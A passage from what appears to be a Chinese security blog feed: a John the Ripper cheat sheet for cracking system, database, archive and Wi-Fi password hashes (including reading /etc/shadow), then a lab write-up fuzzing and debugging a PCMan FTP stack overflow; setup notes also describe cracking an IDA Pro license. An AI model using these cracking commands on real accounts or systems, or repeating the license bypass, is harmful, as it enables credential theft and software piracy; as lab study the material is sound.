	# unshadow /etc/passwd /etc/shadow &amp;gt; /root/Desktop/johnuser.txt
	# unshadow /etc/group /etc/gshadow &amp;gt; /root/Desktop/jonhgroup.txt
	
破解linux系统用户hash:
	一般简单模式破解(如果不手工指定hash类型,john也会帮你自动识别,并提示你):
		# ./john   /root/Desktop/linux.txt --format=sha512crypt --incremental
		# ./john /root/Desktop/group.txt   --format=sha512crypt --incremental
		
	指定用户名破解:
		# ./john /root/Desktop/johnuser.txt  --users=alex --format=sha512crypt --incremental
		# ./john /root/Desktop/johnuser.txt --users=jack,alex --format=sha512crypt --incremental
		
	指定shell破解:
		# ./john /root/Desktop/johnuser.txt  --shells=/bin/rbash --format=sha512crypt --incremental
	
	显示已经破解的hash:
		# ./john  /root/Desktop/tmp.txt  --show
		
破解ntlm(2008):
	# ./john /root/Desktop/ntlm.txt --format=NT2 --incremental

破解mssql系列数据库用户hash:
	2005:
		# ./john /root/Desktop/2005.txt  --format=mssql05  --incremental
		
	2008:
		# ./john /root/Desktop/2008.txt  --format=mssql05  --incremental
		
	2012:
		# ./john /root/Desktop/2012.txt  --format=mssql12  --incremental
	
破解mysql系列数据库用户hash:
	# ./john /root/Desktop/mysql.txt  --format=mysql-sha1  --incremental
	
破解office系列密码(2010):
	# ./office2john.py /root/Desktop/test.docx &amp;gt; /root/Desktop/officehash.txt
	# ./john /root/Desktop/officehash.txt --format=office --incremental

破解drupal7用户密码hash:
	# ./john /root/Desktop/drupal7.txt --format=Drupal7  --incremental
	
破解rar系列密码hash(rar,rar5):
	# ./rar2john /root/Desktop/rar.rar &amp;gt; /root/Desktop/rarhash.txt
	# ./john /root/Desktop/rarhash.txt --format=rar --incremental
	# ./john /root/Desktop/rar5hash.txt --format=rar5 --incremental
	
破解zip密码hash:
	# ./zip2john /root/Desktop/zip.zip &amp;gt; /root/Desktop/ziphash.txt
	# ./john /root/Desktop/ziphash.txt --incremental --format=PKZIP

破解pdf密码hash:
	# ./pdf2john.py /root/Desktop/CMD.pdf &amp;gt; /root/Desktop/pdfhash.txt
	# ./john /root/Desktop/pdfhash.txt

破解filezilla(md5)用户密码hash:
	# ./john /root/Desktop/MD5.txt --format=Raw-MD5 --incremental
	# ./john /root/Desktop/MD5.txt --format=Raw-MD5 --wordlist=/usr/share/wordlists/weakpass.txt
	
破解wpa/wpa2hash:
	# ./john --stdout --incremental:all | aircrack-ng -b apmac -w - wpa2*.cap

破解grub hash:
	
破解radmin用户hash:

破解oracle 11g 以下数据库用户hash:
	
破解ssh key hash: 
	
破解7z密码hash:

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Wed, 22 Jun 2016 00:00:00 +0800</pubDate>
        <link>/crack/2016/06/22/hashcat/</link>
        <guid isPermaLink="true">/crack/2016/06/22/hashcat/</guid>
        
        <category>hashcat</category>
        
        
        <category>crack</category>
        
      </item>
    
      <item>
        <title>pcman-ftp初战漏洞挖掘</title>
        <description>&lt;h3 id=&quot;x01-install-binnavi&quot;&gt;0x01 install binnavi&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://github.com/google/binnavi
http://www.freebuf.com/sectool/75529.html

https://github.com/google/binnavi/releases
http://malwareandmore.blogspot.kr/2015/08/binnavi-install-on-windows.html
https://blog.because-security.com/t/development-environment-for-binnavi-with-a-package-manager-windows/34(better)

直接下载https://github.com/google/binnavi/releases里面的binnavi-all.jar,放到windows下双击,运行不成功说明缺少环境,再从其他几个链接中学习安装
使用教程https://www.zynamics.com/binnavi/manual/html/tutorial.htm
    
最佳安装方案:
将binnavi安装到win2003上
直接双击运行https://github.com/google/binnavi/releases中的binnavi-all.jar,
并将这个链接里面的zynamics_binexport_9.plw和zynamics_binexport_9.p64放入idapro6.8的plugin目录中
将这个链接https://github.com/google/binexport/releases里面的copy_to_ida_root_windows.zip解压后放到ida的根目录下
ida pro6.8的安装如果因为没有注册使得ida pro无法加载binexport9插件(看不到Edit|Plugin|BinExport9说明没有加载成功),则替换ida安装目录下的ida.key文件为这个链接(https://gist.github.com/TheCjw/9f6f7544f33f292db20e)中的ida.key文件,并将系统时间改成若干年前完成ida pro的破解

如果提示有什么问题,再根据
https://blog.because-security.com/t/development-environment-for-binnavi-with-a-package-manager-windows/34
这里面的方法安装缺失依赖,可能不用全部安装完就可以再次尝试直接双击binnavi-all.jar而成功运行

安装postgresql到win2003上会失败,解决方法http://blog.itpub.net/29598413/viewspace-1258961/

以上安装知识理应足够,如需还有这个链接
http://pan.baidu.com/s/1c2Jmtag
里面的readme.md文件有关于安装的问题,另外这个链接里面有大多数需要的依赖环境打包好了

实例安装:(win2003)(事后觉得2中的命令可以不运行,因为binnavi-all.jar为最后编译的结果文件,而2中只是为了编译才做的过程)
0.my_vinnavi从这里下载:http://pan.baidu.com/s/1c2Jmtag
1.安装my_binnavi中的install binnavi on win2003里面的两个exe
2.@powershell -NoProfile -ExecutionPolicy Bypass -Command &quot;iex ((new-object net.webclient).DownloadString(&#39;https://chocolatey.org/install.ps1&#39;))&quot; &amp;amp;&amp;amp; SET PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin
  choco install maven
  choco install ant
  choco install gradle
3.安装jdk8(jdk6不成功),并添加对应C:\Program Files\Java\jdk1.8.0_91\bin和C:\Program Files\Java\jre1.8.0_91\bin到环境变量path,新建一个环境变量JAVA_HOME为C:\Program Files\Java\jdk1.8.0_91\
4.安装idapro6.8,替换key文件,修改本机时间为几年前,将copy_to_ida_root_windows.zip里面的文件放入idapro根目录(重要,没有这步Edit|Plugin中看不到BinExport9),并将binexport的两个文件(zynamics_binexport_9.plw和zynamics_binexport_9.p64)放入idapro的plugin目录
5.安装my_binnavi中的postgresql(x86),数据库用户名和密码设为postgres,将win2003中的c:\program files\postgresql目录设置为everyone有所有权限
6.以管理员身份(否则在binnavi运行后无法import idb文件)运行binnavi-all.jar(win2003下右键以不受限方式打开cmd.exe,然后运行binnavi-all.jar)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x02-fuzz-target-app&quot;&gt;0x02 fuzz target app&lt;/h3&gt;

&lt;h4 id=&quot;about&quot;&gt;about&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;target link:
    https://www.exploit-db.com/exploits/39662/
target ftp app(pcmanftp):
    https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z
ftp fuzz tool:
    http://www.infigo.hr/files/ftpfuzz.zip

challenge:
    尝试找到pcmanftp除了exploit-db中介绍的已经存在的漏洞以外其他的漏洞
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;fuzz&quot;&gt;fuzz&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;安装ftpfuzz(实验中安装到192.168.3.77中)
2&amp;gt;设置user为annoymous,pass为test
3&amp;gt;只取list命令作为fuzz的对象
4&amp;gt;只选择A作为fuzz的数据
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/fuzzftp.png&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;x03-binnavi&quot;&gt;0x03 binnavi使用方法&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0&amp;gt;binnavi安装在win2003上,ip:192.168.3.176
1&amp;gt;新建一个project
2&amp;gt;导入一个模块(ida生成的idb文件)
    出现错误及安装binnavi解决方法可参考https://github.com/google/binnavi/issues/94
3&amp;gt;新建一个debugger:192.168.3.177:2222
    192.168.3.77为安装ftpfuzz工具的一台win7机器,用于fuzz目标192.168.3.177上的pcmanftp
    192.168.3.176为安装binnavi的机器,用于远程调试192.168.3.177上的ftp进程,并追踪ftp进程上的相关指令
    192.168.3.177为目标ftp运行的机器,通过在192.168.3.177上安装idapro(6.8)加载该ftp进程后产生idb文件,将该idb文件复制到192.168.3.176(win2003)上用binnavi加载
    为了实现在192.168.3.176上远程调试192.168.3.177的ftp,需要在192.168.3.177上运行:
        https://github.com/google/binnavi/releases/download/v6.1.0/debugclient.exe
        或
        http://pan.baidu.com/s/1hsK0jwK中的debugclient.exe
    在win7上不要用管理员权限运行,否则debugclient.exe会报断点错误,运行方法:
        win+r
        cmd
        debugclient.exe pid
4&amp;gt;初始化模块
    双击图中的modules下面的pcmanftpd2.exe,或右键选择laod+initial,使得产生图中有Native Callgraph的面板,此时如果双击图中箭头指向的Native Callgraph可产生graph视图,并可从graph视图(图6)的菜单中选择windows下的debug perspective子项进行进程调试和指令追踪,此处不用这种方法,选择下面更好一点的方法
5&amp;gt;产生grahp视图
    双击NewProject,左键按住modules下的pcmanftpd2.exe并拖到NewProject下的Default address space上面,这样将会把导入的idb模块&quot;对应放到&quot;default address space中,然后可以右键单击defalut address space,选择create combined callgraph,此时将产生上面说的graph视图(图6),如果不用这种方法而用上面的方法则不能在defalut address space上右键选择create combined callgraph,binnavi会报错
6&amp;gt;上面的graph视图窗口对应下面的图6
7&amp;gt;动态调试192.168.3.177上的ftp进程并追踪指令
    在正常binnavi窗口中(非graph窗口):
        在NewProject面板中选择并保存上面设置的debugger,如下图7
        在Default address place面板中选择并保存上面设置的debugger,如下图7-2
    在graph窗口中:
        单击菜单中的windows,并选择debug perspective,将打开调试窗口,如下图7-3
        单击下图7-4中的start debug开始进程调试
        单击下图7-4中的start trace mode开始指令追踪
        实验中binnavi版本为最新的6.1+ida pro6.8,安装在win2003系统上,此安装的binnavi有以下问题:
            1.stop trace mode按钮只是前几次有效(eg.10次内的trace列表)
            2.在1下先按stop trace mode再按start trace mode按钮可以实时刷新地跟踪指令
            3.按下超过一定次数的start trace mode(一定trace列表数)2中情况不再有效,需要重新start debugger,这也意味着要重新在192.168.3.177中重新运行pcmanftp,并运行:
                win+r
                cmd
                debugclient.exe pid
            4.binnavi中使用指令追踪功能时除了上面2中的方法也可以通过删除trace列表里面的已存在的trace,然后重新按start trace mode,这样可以不用按像2中(stop trace mode再按start trace mode)而达到指令追踪的目的,192.168.3.177的win7上运行debugclient.exe pid时不用管理员身份运行虽然会报断点错误,但是好像实际实验中追踪效果更好,此点尚疑.一般情况下,每个应用都用管理员身份运行不易出错(debugclient.exe,pcmanftp,binnavi)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图1
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/binnavi-1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图2
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/binnavi-2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图3
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/binnavi-3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图4
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/binnavi-4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图5
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/binnavi-5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图6
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/binnavi-6.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图7
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/binnavi-7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图7-2
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/binnavi-7-2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图7-3
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/binnavi-7-3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图7-4
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/binnavi-7-4.png&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;x03-&quot;&gt;0x03 实战&lt;/h3&gt;

&lt;h4 id=&quot;dep-off&quot;&gt;1&amp;gt;dep off&lt;/h4&gt;

&lt;p&gt;实验中win7系统中默认dep关闭如下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/dep_close_on_win7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;追踪192.168.3.177中的pcmanftp进程的溢出指令&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.运行192.168.3.177上的pcmanftp后用管理员权限运行clientdebug.exe pid,然后单击192.168.3.176上的graph视图窗口下的debug perspective下的start debug,开始远程调试pcmanftp
2.单击start trace mode,binnavi下完断点后再单击start trace mode,此时binnavi中的trace列表如下图a,然后在192.168.3.77(另外一台win7,安装有ftpfuzz工具,用来fuzz目标192.168.3.177里的pcmanftp),事先设置fuzz数据为发送30,70...到9000个A,后来发现发送9000个A会使pcmanftp出错,于是最后设置fuzz数据为只发送9000个A,便于追踪出错的详细汇编语句,如下图b:
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图a
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/a.png&quot; /&gt;
图b
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/fuzz-2.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;3.完成2中的设置后在192.168.3.77中单击上图中的start按钮,用ftpfuzz发送9000个A,只选择LIST命令进行fuzz,fuzz结束后binnavi中对应trace列表如下图trace1,说明ftpfuzz与binnavi的数据交互中共产生了72个event,也即从发送anonymous登录到发送完LIST 9000xA命令后的event,但是这样不能精确追踪到关键溢出(发送9000个A)时的代码,不会将登录ftp的过程记录到event中,使得event有72个,较大,为了精确追踪到pcmanftp对9000个A的数据处理过程,需要过滤掉fuzzftp登录pcmanftp的过程,于是进行如下操作:
    on 192.168.3.177:
        关闭pcmanftp
        打开pcmanftp    #如果不重新打开pcmanftp,客户端用anonymous登录时会报&quot;too many users&quot;错误
        debugclient.exe pid
    on kali:(192.168.3.106)
        ftp
        open 192.168.3.177
        user:anonymous
        pass:test
    on binnavi(192.168.3.176)
        start trace mode    
            #因为上面重新打开了pcmanftp,此处不用先stop trace mode,binnavi自动关闭了
        start trace mode    
            #这条命令执行后trace列表如下图trace2
    on kali:
        LIST AAA...A(9000个)    
            #结果显示&quot;Invalid command&quot;,再看binnavi中trace列表,发现没有新增,结果依然为下图strace2,认为是terminal终端下登录ftp和ftpfuzz工具有点不同,终端下登录可能被本地ftp客户端的程序发现命令不对先给截断了
    
    on 192.168.3.177:
        重新打开pcmanftp并debug     #重新追踪
    on binnavi:
        重新start debug,start trace mode,start trace mode
    on kali:
        ftp
        open 192.168.3.177
        user:anonymous
        pass:test
    on binnavi:
        start trace mode
            #上面annoymous登录后,运行这条命令前binnavi已记录kali中anonymous登录过程中的指令,在binnavi上运行这条命令后,再从kali中传输list Ax9000的命令则将会记录下list Ax9000这个过程中的指令
    on kali:
        ls AA..A(9000个)
            #后来发现terminal下虽然list命令不可以成功,但可以ls 9000个A发送过去
    on binnavi:
        此时产生list 9000xA命令的trace指令列表,如下图trace3,说明list Ax9000这个命令运行后在pcmanftp上有7个event与之对应,此时eip已经被覆盖成41414141,说明大概到图trace3的sub_427350处已经覆盖了eip为41414141了,后来od跟踪发现确实如此
        也即追踪到的关键event(指令)为:
            sub_402B60
            _atoi
            _atoi
            sub_405410
            sub_427350
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图trace1
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/trace1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图trace2
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/trace2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图trace3
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/trace3.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    追踪到相关指令后此时binavi暂时退出,用od调试pcmanftp

    on 192.168.3.177:
        重新打开pcmanftp,od附加
        f9      #此时单击屏幕底部的状态栏发现不能看到pcmanftp的主界面
        ctrl+g:402b60---&amp;gt;f2
        ctrl+g:405410---&amp;gt;f2     
            #405410处像是异常处理程序相关,下面是od中的数据,后来相通了,这显然是在构造se异常处理,将一个异常处理方法放入栈中,线程初始化时,会自动向栈中安装一个seh,用作线程的默认异常处理
        -----------content of 405410------------
        00405410  /$  6A FF         push -0x1
        00405412  |.  68 292D4300   push PCManFTP.00432D29                   ;  SE 处理程序安装
        00405417  |.  64:A1 0000000&amp;gt;mov eax,dword ptr fs:[0]
        0040541D  |.  50            push eax
        0040541E  |.  64:8925 00000&amp;gt;mov dword ptr fs:[0],esp
        00405425  |.  51            push ecx
        00405426  |.  53            push ebx
        00405427  |.  56            push esi                                 ;  PCManFTP.00441250
        00405428  |.  8BF1          mov esi,ecx
        0040542A  |.  897424 08     mov dword ptr ss:[esp+0x8],esi           ;  PCManFTP.00441250
        0040542E  |.  E8 BD120000   call PCManFTP.004066F0
        ---------------end----------------------
        ctrl+g:427350---&amp;gt;f2
    on kali:
        ftp
        open 192.168.3.177  #发现此时不能显示ftp会话消息,像是pcmanftp&quot;卡住了&quot;
    on 192.168.3.177&#39;s od:
        alt+v
        t
        右键resume all threads  
            #此时可以单击状态栏中的pcmanftp可以显示pcmanftp主界面,且kali中也可以显示ftp会话信息,关于&quot;卡住&quot;以后为什么可以通过resume all threads来调试而&quot;不影响&quot;调试目的有以下猜想:
            windows程序有消息响应机制,windows程序中的主线程一直在等待各个子线程的消息,如果某个子线程中断或者出故障了,可能会被主线程知道,然后主线程调用相应方法去处理这个出问题的子线程,这样就可以解释在下完402b60,405410,427350的断点后,发送ls Ax9000到pcmanftp,在od中一直按f9,却没有在某时刻可以看到eip=41414141,而最后由于的确存在某时刻eip=41414141,导致异常,最后弹出如下图error显示的错误对话框,对话框中显示出错原因为eip被41414141覆盖,这样大概是因为当eip在某时刻被41414141覆盖的时候,于是这个子线程出故障了,程序的主线程知道了这个消息,然后调用seh链中的异常处理程序,处理的结果就是弹出这样一个错误详细信息对话框
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图error
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/error.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;on kali:
    user:anonymous
    pass:test
    ls AAA..A(9000个)
on 192.168.3.177&#39;od:
    此时中断在402b60处
    在堆栈窗口中:ctrl+b查找AAAA
        #提示没有找到
    f9
    此时中断在405410处
    在堆栈窗口中:ctrl+b查找AAAA
        #提示没有找到
    f9
    此时中断在427350处
    在堆栈窗口中:ctrl+b查找AAAA
        #提示找到,说明通过binnavi找到的这些event中,关键的覆盖eip的指令在405410到427350这两个断点之间
    载pcmanftp,并重点关注405410到427350这两个断点之间会经过的指令
    
on 192.168.3.177&#39;s od:(重复以上加载并resume all threads过程直到中断到405410处)
    ...
    ...
    ...
    --------查找关键汇编指令方法---------
    结过漫长的ctrl+f9,f8,时刻关注堆栈,寄存器,反汇编窗口指令等,在可疑函数f8单步步过后在堆栈窗口中ctrl+b查找AAAA
    --------------end--------------------

现从405410到427350两个断点之间的指令,如果通过f8,f7,ctrl+f9等的一步一步调试无法到达覆盖eip的关键指令处,而通过在405410断点处直接f9到427350处会经过覆盖eip的关键指令处,然而确无法单步调试到关键指令处.

单步调试时指令经过流程为:
    405410到427350,再由427350到427350
    其中405410到427350流程中无法捕捉到覆盖eip的关键指令,于是指令开始在427350到427350之间一直循环,像是一个进程阻塞当中(eg.listen,accept),427350到427350也无法捕捉到覆盖eip的关键指令,在427350处f9到427350时,情况和下面的405410处f9到427350的情况一样

但是,两个断点之间f9运行调试时:
    在405410处f9到427350时,在堆栈窗口中ctrl+b:41414141却能找到41414141,说明f9运行时,的确经过了覆盖eip的关键指令

出现以上这种现象暂时不能理解,猜测有可能是427350是一个循环等待的函数,并且与有时间相关,如果每次时间超过一定时间(单步调试程序某个线程等待造成时间较长),这个427350处的循环等待判断为无效,即只在一定时间内判定为有效循环等待(这样在427350处f9运行调试到427350处时可以在堆栈窗口捕获到AAAA就可以理解了)

于是尝试在405410和427350下断点后(到此处不用在402b60处下断点了),f9运行pcmanftp,然后在kali中的terminal中ftp open 192.168.3.177登录,之后输入ls 9000xA命令,待od中中断到405410时,在od的汇编代码区右键查看所有模块间调用,并在所有模块间调用处下断点,然后一直f9运行调试pcmanftp,这样有可能会在堆栈区捕获到AAAA,具体步骤如下:

on 192.168.3.177&#39;s od:
    alt+f2      #关闭调试程序
    重新运行pcmanftp并附加到od
    ctrl+g:405410---&amp;gt;f2
    ctrl+g:427350---&amp;gt;f2
    f9
on kali:
    ftp
    open 192.168.3.177
on 192.168.3.177&#39;s od:
    f9      #不是必须
    alt+v
    t
    右键resume all threads
on kali:
    user:anonymous
    pass:test
    ls AAA..A(9000个)
on 192.168.3.177&#39;s od:
    自动中断在405410处
    右键查找所有模块间调用
    在每个命令上设置断点
    alt+c
    f9
    ...
    (alt+c后共输入123个f9)
    此时观察到堆栈区第一次出现大长串AAAAAAAAAA,断点处在416685,也即在416685处的模块间调用开始出现AAAAAAA,如下图od1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图od1
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/od1.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;于是重新在405410,416685,427350处下断点,重点关注405410到416685后,在416685开始的指令流程,具体如下:

on 192.168.3.177&#39;od:
    ctrl+g:405410---&amp;gt;f2
    ctrl+g:427350---&amp;gt;f2
    f9
on kali:
    ftp
    open 192.168.3.177
on 192.168.3.177&#39;od:
    alt+v
    t
    resume all threads
on kali:
    user:anonymous
    pass:test
    ls AA..A(9000个)
on 192.168.3.177&#39;s od:
    ctrl+g:416685---&amp;gt;f2
    alt+c
    此时自动中断在405410处

    ------------output:-----------
    00405410  /$  6A FF         push -0x1
    00405412  |.  68 292D4300   push PCManFTP.00432D29                   ;  SE 处理程序安装
    00405417  |.  64:A1 0000000&amp;gt;mov eax,dword ptr fs:[0]
    0040541D  |.  50            push eax
    --------------end-------------

    f9
    此时自动中断在416685处

    -----------output:-----------
    00416685  |.  FF15 58524300 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.GetLastErr&amp;gt;; [GetLastError
    0041668B  |.  FF35 B0284400 push dword ptr ds:[0x4428B0]             ; /TlsIndex = 1A
    00416691  |.  8BF8          mov edi,eax                              ; |
    00416693  |.  FF15 98514300 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.TlsGetValu&amp;gt;; \TlsGetValue
    ------------end---------------

    f9
    此时又中断到416685处(不过堆栈窗口出现了AAAAAAA)

    ------------output:-----------
    00416685  |.  FF15 58524300 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.GetLastErr&amp;gt;; [GetLastError
    0041668B  |.  FF35 B0284400 push dword ptr ds:[0x4428B0]             ; /TlsIndex = 1A
    00416691  |.  8BF8          mov edi,eax                              ; |
    00416693  |.  FF15 98514300 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.TlsGetValu&amp;gt;; \TlsGetValue
    --------------end--------------
    
    此时对应的od中截图如下图od2:
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图od2
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/od2.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;esp下面的第一个返回到的地址为当前栈帧的返回地址,也即汇编窗口中004166e9处的retn要返回到的地址
esp下面的第二个返回到的地址4029db为当前函数栈帧的上一函数栈帧中的retn要返回的地址
esp下面的第三个返回到的地址4029ff为当前函数栈帧的上一函数的上一函数的栈帧中的retn要返回的地址

此时堆栈窗口数据如下:
    ----------------stack------------------
    0018ED28   00000402
    0018ED2C   004411DC  ASCII &quot;
    &quot;
    0018ED30   00412967  返回到 PCManFTP.00412967 来自 PCManFTP.00416683
    0018ED34   00000402
    0018ED38   00000000
    0018ED3C   00000000
    0018ED40   0018ED68
    0018ED44   0018ED64
    0018ED48   00000000
    0018ED4C   00000000
    0018ED50   00001000
    0018ED54   0018ED78  ASCII &quot;LIST AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;...
    0018ED58   01D817A0
    0018ED5C   004029DB  返回到 PCManFTP.004029DB 来自 wsock32.recv
    0018ED60   01D817A0
    0018ED64   004029EF  返回到 PCManFTP.004029EF 来自 PCManFTP.00412956
    0018ED68   0018ED78  ASCII &quot;LIST AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;...
    0018ED6C   004411DC  ASCII &quot;
    &quot;
    0018ED70   00000000
    0018ED74   00000001
    0018ED78   5453494C
    0018ED7C   41414120
    0018ED80   41414141
    0018ED84   41414141
    0018ED88   41414141
    0018ED8C   41414141
    -----------------end-------------------

参照上一篇文章:
http://3xp10it.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%85%A5%E9%97%A8-%E5%8A%A8%E6%80%81%E8%B7%9F%E8%B8%AA%E6%BA%90%E4%BB%A3%E7%A0%81%E5%92%8C%E5%8F%8D%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81/中的图stack0易知:
    
    其中栈中0018ed8c以后很长一段数据都是41414141,由于此时中断到416685而堆栈窗口中首次出现AAAAAA数据,而堆栈窗口中最近的三个返回地址中00412976对应的是本函数栈帧(对应图od2)中的004166e9处的retn,这样的话,很有可能是本函数栈帧的上一帧函数(该函数内的retn对应返回到4029db)或者是上上一帧函数(该函数内的retn对应返回到4029ef)的返回地址被此时栈中的大长串A覆盖成41414141
    当前eip对应的函数帧是00416683函数,当前函数帧的上一帧函数是wsock32.recv,wsock32.recv函数帧的上一函数帧的00412956函数,形如下面表示:
    -----------------------------format:--------------------------------
    00412956:(412956函数帧)
            00412954:push ebp
            xxxxxxxx:mov ebp,esp
            xxxxxxxx:...
            xxxxxxxx:...
            xxxxxxxx:call wsock32.recv(这条汇编语句的下一条语句的地址为004029db)
                       (wsock32.recv函数帧)
                       recv&#39;s addr:push ebp
                       xxxxxxxx:mov ebp,esp
                       xxxxxxxx:...
                       xxxxxxxx:...
                       xxxxxxxx:call 00416683(这条汇编语句的下一条语句的地址为00412967)
                                  (00416683函数帧,对应图od2中语句)
                                  00416683:push ebp
                                  xxxxxxxx:mov ebp,esp
                                  xxxxxxxx:...
                                  xxxxxxxx:...
                                  00416685:call getlasterror
                                  0041668b:push ds:[0x4428b0]
                                  xxxxxxxx:...
                                  xxxxxxxx:...
                                  004166e9:retn(将返回到00412967)
                                  ...
                                  ...
                       00412967:...(此处00412967对应为上面call 00416683语句中00416683函数的返回地址)
                       ...
                       ...
                       xxxxxxxx:retn(将返回到004029db)
                       ...
                       ...
            004029db:...(此处004029db对应为上面call wsock32.recv语句中wsock32.recv函数的返回地址)
            ...
            ...
            xxxxxxxx:retn(将返回到004029ef)
            ...
            ...
    004029ef:xxx(此处004029ef对应00412956函数桢中的retn语句要返回的地址)
    -------------------------------end----------------------------------
        
    所以有可能当前函数帧(对应图od2)中的汇编语句(执行到4166e9处的retn之前的语句)会导致栈中的两个返回地址(0018ed5c处的004029db和0018ed64处的004029ef)被覆盖,也有可能在wsock32.recv函数帧中某语句覆盖0018ed64处的004029ef,也有可能是本函数帧(00416683,正常情况下esp下面最近一个返回地址在od中显示来自于什么函数则当前eip在该函数帧中)的下一函数帧(也即还没执行到的函数,当前函数帧为最新函数帧)中的汇编语句覆盖两个返回地址或这两个返回地址下面比较远的返回地址等

    于是重点关注堆栈窗口中的0018ed5c处的004029db和0018ed64处的004029ef是否可能会在当前函数帧中执行到004166e9之前或下一个将到达的函数帧中被改写成41414141

    在od中f8单步调试时,遇到可疑指令如call xxx等,在堆栈窗口中ctrl+g(堆栈中跟随):0018ed5c或0018ed64,然后f8单步调试,具体如下操作:

    ------------从图od2中情况下开始的操作-------------
    f8
    f8
    ..
    f8
